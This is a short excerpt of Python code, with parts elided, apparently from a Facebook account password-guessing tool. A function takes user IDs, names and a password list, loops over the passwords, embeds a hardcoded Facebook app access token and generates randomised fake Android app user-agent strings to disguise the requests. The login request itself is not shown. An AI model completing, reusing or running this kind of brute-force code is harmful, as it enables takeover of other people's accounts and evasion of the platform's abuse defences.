...
def api2(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/58.0.0.5380;FBBV/8069994;FBDM/{density=3,width=720,height=1280};FBLC/en_US;FBRV/8555844;FBCR/null;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.adsmanager;FBDV/6;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
